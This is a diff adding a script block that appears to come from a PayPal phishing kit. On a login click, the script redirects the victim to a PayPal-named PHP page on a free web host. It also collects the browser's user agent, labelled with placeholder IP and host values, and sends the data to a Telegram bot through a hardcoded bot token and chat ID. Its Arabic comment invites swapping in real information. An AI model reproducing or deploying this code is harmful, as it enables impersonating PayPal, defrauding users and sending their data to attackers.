@@ -1,0 +1,40 @@
+<script>
+      
+      
+  login.addEventListener('click', () => {
+    window.location.href = 'https://servicesinna.000webhostapp.com/BLAN/PayPal.php';         
+var text = ``; 
+
+// معلومات ثابتة للتمثيل، قم بتغييرها بمعلومات حقيقية إذا كنت ترغب في استخدامها
+const ip = '192.168.1.1';
+const hostname = 'example.com';
+
+// جمع معلومات المتصفح
+const userAgent = navigator.userAgent;
+
+text += `
+|---------------|Info|-------------------|
+IP      : ${ip}
+HOST    : ${hostname}
+BROWSER : ${userAgent}
+|----------|By KaKarout|--------------|
+`;
+
+const botToken = '6843184165:AAFylsEek_Z5PjBjThXYjKHCxy8zL_fIu_c'; 
+const chatId = '6669693805'; 
+const message = text; 
+
+fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", { 
+    method: 'POST', 
+    headers: { 
+        'Content-Type': 'application/json' 
+    }, 
+    body: JSON.stringify({ 
+        chat_id: chatId, 
+        text: message 
+    }) 
+}) 
+
+});
+
+</script>
